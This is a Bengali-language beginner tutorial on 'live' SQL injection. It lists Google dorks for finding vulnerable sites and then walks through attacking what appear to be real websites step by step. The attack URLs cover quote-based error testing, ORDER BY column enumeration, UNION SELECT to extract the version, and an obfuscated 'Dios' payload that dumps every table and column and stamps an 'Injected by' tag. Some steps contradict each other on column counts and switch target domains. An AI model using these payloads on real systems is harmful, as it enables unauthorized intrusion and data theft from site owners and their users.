শুধু মাত্র নতুনদের জন্য অবিজ্ঞরা দূরে থাকুন ।
Live SQL injection

প্রথমে SQL INJECT করার জন্য আমাদের ভার্নাবল সাইট খুজতে হবে।
এর জন্য আমরা dork  use করব !
inurl:article.php?ID=
inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
এখানে  কিছু dork আছে sql ভার্নাবল সাইট খুজার জন্য !

প্রথমে যে কোন একটা dork নিয়ে আমি  http://www.google.com এ  SEARCH  দিব !

inurl:index.php?id=

এই উপরের  dork টি  দিয়া SEARCH দিয়ে আমি অনেক সাইট দেখলাম সেখান থেকে আমি একটা সাইট নিলাম ।
যেমন :
http://www.orvec.com/news-article.php?id=5

প্রথমে SQL INJECT করার জন্য সাইটের ID ভেল্যু খুজতে হয় ।এরপর আপনাকে দেখতে হবে সাইট টি injectable কিনা ।

এর জন্য আপনাকে url এর শেষে একটি ' বসাতে হবে ।
http://www.orvec.com/news-article.php?id=5'

যদি ডাটাবেজের কিছু মিসিং আসে বা পেজের কিছু ইরর আসে তাহলে বুঝবেন সাইট টি injectable ।
যেমন : “You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1″
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home1/aquacity/public_html/page.php on line 6

এখন আপনাকে দেখতে হবে সাইট টি Union based নাকি string based

String based '--+-

UNION based --
যেমন :
http://www.orvec.com/news-article.php?id=5'--+-

যদি ডাটাবেজের কিছু মিসিং না আসে  তাহলে বুঝবেন string based

যদি ডাটাবেজের কিছু মিসিং আসে  তাহলে বুঝবেন  Union based 

সাইট টি string based

এখন injectable সাইটে inject করার জন্য আপনাকে প্রথমে ডাটাবেজের কলাম বের করতে হবে ।

এখানে আমাদের ভার্নাবল সাইট

http://www.orvec.com/news-article.php?id=5'--+-

আমাদের ডাটাবেজের কলাম বের করতে হলে প্রথমে  +order+by+ কমান্ড দিতে হবে ।

তাহলে লিংকটি দাড়ায়

http://www.orvec.com/news-article.php?id=5'ORDER+BY+1--+-

এখন  By+ এর শেষে আপনাকে 1 থেকে শুরু করে ততক্ষণ পর্যন্ত চেষ্টা করতে হবে যতক্ষণ কোন  error বা মিসিং না দেখায় ।

নাহ , তাহলে সাইটে কোনো ডাটা মিস করতেছে না ।

এখন আবার 2 দিয়ে চেষ্টা করি

http://www.orvec.com/news-article.php?id=5'ORDER+BY+2--+-

এবারও ডাটা মিস করতেছে না ।

এবাবে 1,2,3,4,5,6,7,8 পর্যন্ত গেলাম ।

http://www.orvec.com/news-article.php?id=5'ORDER+BY+3--+-

9 এ গেলে পুরো সাইট SQL ইরর দেখায় ।

তাহলে সম্পূর্ণ লিঙ্কটি হবে

https://www.aquacity.com.pk/page.php?id=1'ORDER+BY+4--+-

ইরর এরকমের হতে পারে ।

Could not connect to MySQL server: Unknown column ’9′ in ‘order clause’ ।

অর্থ্যাত্‍ এই সাইটের ডাটাবেজের কলাম 8 টি ।

এখন আমাদের দেখতে হবে এই 4 টা কলামের ভেতর ভার্নাবল কোনটি ।এর জন্য আমাদের আবার কমান্ড ব্যবহার করতে হবে ।

কমান্ড টি হবে এমন
'AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-

তাহলে লিংক টি দাড়াবে

http://www.orvec.com/news-article.php?id=5'AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-





এখন আপনি ভার্নাবল কলাম দেখতে পাবেন ।

এই সাইটের ভার্নাবল কলাম 6,দেখাবে ।

এখানে আমরা 6 নম্বর কলাম নিয়ে কাজ করবো ।আপনার টার্গেট সাইট যা পাবেন তা নিয়ে কাজ করতে হবে।

এখন আমরা ভার্নাবল কলামের ভার্সন বের করবোঃ

এর জন্য আপনাকে আবার একটি কমান্ড ব্যবহার করতে হবে ।
এখন আগের লিংকে শুধু 6 এর version() জায়গায়  দিতে হবে ।

তাহলে আমার লিংক টি দাড়ায় এমন ।

http://www.orvec.com/news-article.php?id=5'AND+0+UNION+SELECT*/+1,2,3,4,5,version(),7,8--+-
ছবিঃ

এই লিংকে গেলে আমরা ভার্সন দেখতে পাবো ।

এটার ভার্সন 5.7.16

এখন আমরা সব  টেবিল এবং কলাম বাহির করবDios দিয়ে:

তাহলে লিংকটি দাড়ালো
http://www.orvec.com/news-article.php?id=5'AND+0+UNION+SELECT+1,2,3,4,5,/*!50000concat/**Rh**/*/(0x3c62723e,0x3c696d67207372633d2268747470733a2f2f662e746f7034746f702e696f2f705f32303036306e713168312e706e67222077696474683d2233303022206865696768743d22333030223e,0x3c62723e,0x3c666f6e7420636f6c6f723d22726564223e3c623e,0x496e6a656374656420627920443141524b2d5641345533,0x3c2f623e,0x3c2f666f6e743e,0x3c62723e,0x557365723a3a,current_user,0x3c62723e,0x56657273696f6e3a3a,version(),0x3c62723e,0x44617461626173653a3a,database/*data*//**Rh**/(),0x3c62723e,0x3c62723e,(select(@x)/*!50000from/**Rh**/*/(/*!50000select/**Rh**/*/(@x:=0x00),(select(0)/*!From/**Rh**/*/(/*!50000information_schema.columns/**Rh**/*/)/*!50000where/**Rh**/*/(table_schema=database/*data*//**Rh*/())and(0x00)in(@x:=/*!50000coNcat/**Rh**/*/(@x,0x3c6c693e,/*!50000table_name/**Rh**/*/,0x3a3a,/*!50000column_name/**Rh**/*/))))x)),7,8--+-
  
এই সাইটের টেবিল এবং কলাম  দেখতে পারবেন

  
